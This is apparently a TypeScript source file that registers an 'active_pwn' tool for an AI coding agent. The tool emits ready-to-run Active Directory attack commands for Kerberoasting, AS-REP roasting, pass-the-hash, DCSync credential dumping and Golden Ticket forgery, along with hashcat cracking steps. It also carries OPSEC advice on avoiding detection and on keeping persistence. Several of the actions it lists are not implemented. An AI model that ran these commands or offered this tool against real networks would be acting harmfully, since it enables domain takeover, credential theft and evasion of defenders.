export * as ActivePwnTool from "./active-pwn"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "active_pwn"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Active Directory attack action: 'bloodhound' (run BloodHound collector), 'kerberoast' (Kerberoasting — extract service tickets for offline crack), 'asreproast' (AS-REP Roasting — accounts without pre-auth), 'pass_hash' (Pass-the-Hash attack), 'pass_ticket' (Pass-the-Ticket with .ccache/.kirbi), 'dcsync' (DCSync — dump AD credentials via replication), 'golden_ticket' (forge Golden Ticket), 'silver_ticket' (forge Silver Ticket), 'laps_bypass' (read LAPS passwords), 'delegation_abuse' (Kerberos delegation attacks), 'acl_abuse' (WriteDACL/WriteOwner/GenericAll ACL exploitation), 'ldap_enum' (LDAP enumeration without tools), 'spray' (domain password spray), 'pth_lateral' (PTH lateral movement with psexec/wmi)",
  }),
  dc_ip: Schema.String.pipe(Schema.optional).annotate({
    description: "Domain Controller IP address.",
  }),
  domain: Schema.String.pipe(Schema.optional).annotate({
    description: "Domain name (e.g., 'corp.local', 'contoso.com').",
  }),
  username: Schema.String.pipe(Schema.optional).annotate({
    description: "Compromised username for authenticated attacks.",
  }),
  password: Schema.String.pipe(Schema.optional).annotate({
    description: "Password or NTLM hash (format: LM:NT or just NT hash).",
  }),
  target_user: Schema.String.pipe(Schema.optional).annotate({
    description: "Target user/computer for specific attacks (golden ticket, ACL abuse, etc.).",
  }),
  krbtgt_hash: Schema.String.pipe(Schema.optional).annotate({
    description: "krbtgt NTLM hash for Golden Ticket (from DCSync).",
  }),
  domain_sid: Schema.String.pipe(Schema.optional).annotate({
    description: "Domain SID for Golden/Silver ticket (e.g., 'S-1-5-21-...'). Get from DCSync output.",
  }),
  output_path: Schema.String.pipe(Schema.optional).annotate({
    description: "Output file path for captured data. Default: ./ad-output",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  commands: Schema.Array(Schema.String),
})

type Output = typeof Output.Type

const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"

function buildCommands(action: string, opts: {
  dcIp: string, domain: string, username: string, password: string,
  targetUser: string, krbtgtHash: string, domainSid: string, outputPath: string,
}): { commands: string[], explanation: string[], nextSteps: string[] } {
  const { dcIp, domain, username, password, targetUser, krbtgtHash, domainSid, outputPath } = opts

  switch (action) {
    case "bloodhound":
      return {
        commands: [
          `# BloodHound Data Collection`,
          `# Method 1: SharpHound (on Windows target)`,
          `SharpHound.exe -c All --OutputDirectory ${outputPath} --ZipFileName bloodhound.zip`,
          `SharpHound.exe -c All,GPOLocalGroup,LoggedOn --OutputDirectory ${outputPath}`,
          ``,
          `# Method 2: bloodhound-python (from attacker Linux — remote)`,
          `bloodhound-python -d ${domain} -u ${username} -p '${password}' -dc ${dcIp} -c all --zip`,
          `bloodhound-python -d ${domain} -u ${username} -p '${password}' -ns ${dcIp} -c all`,
          ``,
          `# Method 3: ADExplorer snapshot (very stealthy — uses legitimate MS tool)`,
          `# Run ADExplorer.exe, take snapshot, convert with adexplorer2bloodhound`,
          ``,
          `# After collection: upload zip to BloodHound UI`,
          `# Key queries to run in BloodHound:`,
          `# - "Find Shortest Paths to Domain Admins"`,
          `# - "Find Principals with DCSync Rights"`,
          `# - "Find Computers where Domain Users are Local Admin"`,
          `# - "Shortest Paths to Unconstrained Delegation Systems"`,
        ],
        explanation: [
          "BloodHound maps Active Directory relationships and attack paths using graph theory.",
          "All paths from any user to Domain Admin are automatically identified.",
        ],
        nextSteps: [
          "Analyze results → look for: WriteDACL, GenericAll, DCSync rights on DA-accessible paths",
          "Common quick wins: constrained delegation, LAPS readable by low-priv users, AS-REP roastable accounts",
        ],
      }

    case "kerberoast":
      return {
        commands: [
          `# Kerberoasting — request TGS tickets for SPNs, crack offline`,
          ``,
          `# Impacket (Linux — no target binary needed)`,
          `impacket-GetUserSPNs ${domain}/${username}:'${password}' -dc-ip ${dcIp} -request -outputfile ${outputPath}/kerberoast.txt`,
          `impacket-GetUserSPNs ${domain}/${username}:'${password}' -dc-ip ${dcIp} -request -format hashcat`,
          ``,
          `# PowerView (Windows — in-memory)`,
          `Import-Module ./PowerView.ps1`,
          `Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | Out-File ${outputPath}/kerberoast.txt`,
          ``,
          `# Rubeus (Windows — preferred, more options)`,
          `Rubeus.exe kerberoast /format:hashcat /outfile:${outputPath}/kerberoast.txt`,
          `Rubeus.exe kerberoast /format:hashcat /simple /nowrap`,
          ``,
          `# Targeted kerberoast (specific user)`,
          `Rubeus.exe kerberoast /user:${targetUser || "svc_account"} /format:hashcat /nowrap`,
          ``,
          `# Crack with hashcat`,
          `hashcat -m 13100 ${outputPath}/kerberoast.txt /usr/share/wordlists/rockyou.txt`,
          `hashcat -m 13100 ${outputPath}/kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule`,
        ],
        explanation: [
          "Kerberoasting extracts Kerberos TGS ticket hashes for accounts with SPNs (Service Principal Names).",
          "Any authenticated domain user can request TGS tickets. The ticket is encrypted with the service account's NTLM hash.",
          "Crack offline → get service account password → often high-privilege (SQL, IIS, backup accounts).",
        ],
        nextSteps: [
          "After cracking: check group membership of service account",
          "Service accounts often have Domain Admin or high-value group membership",
          "Use cracked creds for: lateral movement, dcsync, golden ticket",
        ],
      }

    case "asreproast":
      return {
        commands: [
          `# AS-REP Roasting — accounts with 'Do not require Kerberos pre-authentication'`,
          ``,
          `# Impacket (no creds needed if pre-auth disabled!)`,
          `impacket-GetNPUsers ${domain}/ -usersfile ${outputPath}/users.txt -format hashcat -outputfile ${outputPath}/asrep.txt -dc-ip ${dcIp}`,
          `# With creds (enumerate then roast):`,
          `impacket-GetNPUsers ${domain}/${username}:'${password}' -request -format hashcat -outputfile ${outputPath}/asrep.txt -dc-ip ${dcIp}`,
          ``,
          `# Rubeus (Windows)`,
          `Rubeus.exe asreproast /format:hashcat /outfile:${outputPath}/asrep.txt`,
          ``,
          `# PowerView — find vulnerable accounts`,
          `Get-DomainUser -PreauthNotRequired | select samaccountname`,
          ``,
          `# Crack with hashcat`,
          `hashcat -m 18200 ${outputPath}/asrep.txt /usr/share/wordlists/rockyou.txt`,
          `hashcat -m 18200 ${outputPath}/asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule`,
        ],
        explanation: [
          "AS-REP Roasting targets accounts with UF_DONT_REQUIRE_PREAUTH flag set.",
          "The KDC returns an AS-REP encrypted with the user's password hash — no creds needed!",
        ],
        nextSteps: [
          "Even one cracked account provides domain enumeration rights",
          "Combined with LDAP enum to find more attack paths",
        ],
      }

    case "pass_hash":
      return {
        commands: [
          `# Pass-the-Hash (PTH) — authenticate with NTLM hash without knowing password`,
          `# Requires: target username + NTLM hash (LM:NT or just NT)`,
          ``,
          `# Impacket — remote command execution`,
          `impacket-psexec ${domain}/${username}@${dcIp || "TARGET_IP"} -hashes :${password || "NTLM_HASH"}`,
          `impacket-wmiexec ${domain}/${username}@${dcIp || "TARGET_IP"} -hashes :${password || "NTLM_HASH"}`,
          `impacket-smbexec ${domain}/${username}@${dcIp || "TARGET_IP"} -hashes :${password || "NTLM_HASH"}`,
          ``,
          `# CrackMapExec — spray across subnet`,
          `crackmapexec smb 10.10.10.0/24 -u ${username} -H ${password || "NTLM_HASH"} --local-auth`,
          `crackmapexec smb ${dcIp || "TARGET_IP"} -u ${username} -H ${password || "NTLM_HASH"} -x "whoami /all"`,
          ``,
          `# Mimikatz (Windows — in-memory)`,
          `privilege::debug`,
          `sekurlsa::pth /user:${username} /domain:${domain} /ntlm:${password || "NTLM_HASH"} /run:cmd.exe`,
          ``,
          `# Evil-WinRM (if WinRM/5985 open)`,
          `evil-winrm -i ${dcIp || "TARGET_IP"} -u ${username} -H ${password || "NTLM_HASH"}`,
        ],
        explanation: [
          "PTH exploits NTLM authentication — credentials are the hash, not the plaintext password.",
          "Works because NTLM auth literally sends the hash. You have the hash → you ARE the user.",
        ],
        nextSteps: [
          "After shell: run mimikatz to dump more creds → lateral to more machines",
          "Check if account is local admin on many machines (CrackMapExec shows this)",
        ],
      }

    case "dcsync":
      return {
        commands: [
          `# DCSync — replicate AD credentials without logging on to DC`,
          `# Requires: Domain Admin, Domain Replication rights, or DCSync ACE`,
          ``,
          `# Impacket (Linux — preferred)`,
          `impacket-secretsdump ${domain}/${username}:'${password}'@${dcIp} -just-dc-ntlm`,
          `impacket-secretsdump ${domain}/${username}:'${password}'@${dcIp} -just-dc -output ${outputPath}/dcsync`,
          `# Dump specific user (krbtgt for Golden Ticket):`,
          `impacket-secretsdump ${domain}/${username}:'${password}'@${dcIp} -just-dc-user krbtgt`,
          `impacket-secretsdump ${domain}/${username}:'${password}'@${dcIp} -just-dc-user administrator`,
          ``,
          `# Mimikatz (Windows)`,
          `privilege::debug`,
          `lsadump::dcsync /domain:${domain} /user:krbtgt`,
          `lsadump::dcsync /domain:${domain} /all /csv`,
          ``,
          `# With PTH (if you have admin hash but not plaintext)`,
          `impacket-secretsdump ${domain}/${username}@${dcIp} -hashes :${password || "ADMIN_HASH"} -just-dc-ntlm`,
        ],
        explanation: [
          "DCSync mimics a Domain Controller replication request to extract password hashes for any AD object.",
          "Gets krbtgt hash (→ Golden Ticket), all domain user hashes, machine account hashes.",
          "Logged in DC event log (Event ID 4662) but often missed by defenders.",
        ],
        nextSteps: [
          "With krbtgt hash → forge Golden Ticket → persistent Domain Admin forever",
          "With Administrator hash → Pass-the-Hash to any machine",
          "DUMP ALL then crack offline — don't stay connected",
        ],
      }

    case "golden_ticket":
      return {
        commands: [
          `# Golden Ticket — forge TGT as any user, valid for 10+ years by default`,
          `# Requires: krbtgt NTLM hash + Domain SID (both from DCSync)`,
          ``,
          `# Mimikatz (Windows)`,
          `kerberos::golden /user:Administrator /domain:${domain} /sid:${domainSid || "DOMAIN_SID"} /krbtgt:${krbtgtHash || "KRBTGT_HASH"} /id:500 /groups:512,513,518,519,520 /ticket:${outputPath}/golden.kirbi`,
          `# Inject ticket into current session`,
          `kerberos::ptt golden.kirbi`,
          `# Verify`,
          `klist`,
          `dir \\\\${dcIp}\\c$`,
          ``,
          `# Impacket (Linux)`,
          `impacket-ticketer -nthash ${krbtgtHash || "KRBTGT_HASH"} -domain-sid ${domainSid || "DOMAIN_SID"} -domain ${domain} Administrator`,
          `# Use ticket`,
          `export KRB5CCNAME=${outputPath}/Administrator.ccache`,
          `impacket-psexec ${domain}/Administrator@${dcIp} -k -no-pass`,
          `impacket-wmiexec ${domain}/Administrator@${dcIp} -k -no-pass`,
        ],
        explanation: [
          "Golden Ticket creates a completely forged Kerberos TGT signed by the krbtgt hash.",
          "Bypasses all password changes — only resetting krbtgt password TWICE kills it.",
          "Effectively: permanent Domain Admin access, undetectable without specific tooling.",
        ],
        nextSteps: [
          "Create ticket with 10-year lifetime: /endin:262800 (minutes)",
          "Backup the .kirbi file — this is your persistence mechanism",
          "krbtgt must be reset TWICE by defenders to invalidate (golden ticket is valid until krbtgt hash changes)",
        ],
      }

    default:
      return {
        commands: [`# Action: ${action}`, `# Supported: bloodhound, kerberoast, asreproast, pass_hash, pass_ticket, dcsync, golden_ticket, silver_ticket, laps_bypass, delegation_abuse, acl_abuse, ldap_enum, spray, pth_lateral`],
        explanation: [`Unknown action: ${action}`],
        nextSteps: [],
      }
  }
}

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Active Directory domination toolkit. Covers the complete AD attack chain: BloodHound data collection (SharpHound, bloodhound-python, ADExplorer), Kerberoasting (impacket-GetUserSPNs, Rubeus, hashcat cracking), AS-REP Roasting (no-creds variant for pre-auth disabled accounts), Pass-the-Hash (psexec/wmiexec/smbexec/evil-winrm), Pass-the-Ticket, DCSync (impacket-secretsdump, mimikatz lsadump::dcsync), Golden Ticket forgery (permanent Domain Admin), Silver Ticket, LAPS password extraction, Kerberos delegation abuse (unconstrained/constrained), ACL-based privilege escalation (WriteDACL/WriteOwner/GenericAll), LDAP enumeration, domain password spraying. Each attack includes Linux (impacket) and Windows (Mimikatz/Rubeus/PowerView) variants.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()

              const { commands, explanation, nextSteps } = buildCommands(action, {
                dcIp: input.dc_ip ?? "DC_IP",
                domain: input.domain ?? "DOMAIN.LOCAL",
                username: input.username ?? "USER",
                password: input.password ?? "PASSWORD",
                targetUser: input.target_user ?? "",
                krbtgtHash: input.krbtgt_hash ?? "KRBTGT_HASH",
                domainSid: input.domain_sid ?? "S-1-5-21-DOMAIN-SID",
                outputPath: input.output_path ?? "./ad-output",
              })

              const sections = [
                `# Active Directory Attack: ${action.toUpperCase()}`,
                `**DC:** ${input.dc_ip ?? "N/A"} | **Domain:** ${input.domain ?? "N/A"} | **User:** ${input.username ?? "N/A"}`,
                "",
                "## Explanation",
                ...explanation.map(e => `> ${e}`),
                "",
                "## Commands",
                "```bash",
                ...commands,
                "```",
                "",
                ...(nextSteps.length > 0 ? ["## Next Steps", ...nextSteps.map(s => `- ${s}`)] : []),
                "",
                "## OPSEC Notes",
                "- DCSync triggers Event ID 4662 on DC — use during high-traffic hours",
                "- Kerberoasting triggers Kerberos ticket requests — use targeted mode to reduce noise",
                "- BloodHound collection is noisy — ADExplorer snapshot is stealthier",
                "- Delete all tools and tickets from target after use",
              ]

              return { output: sections.join("\n"), commands }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Active directory attack failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/active-pwn",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
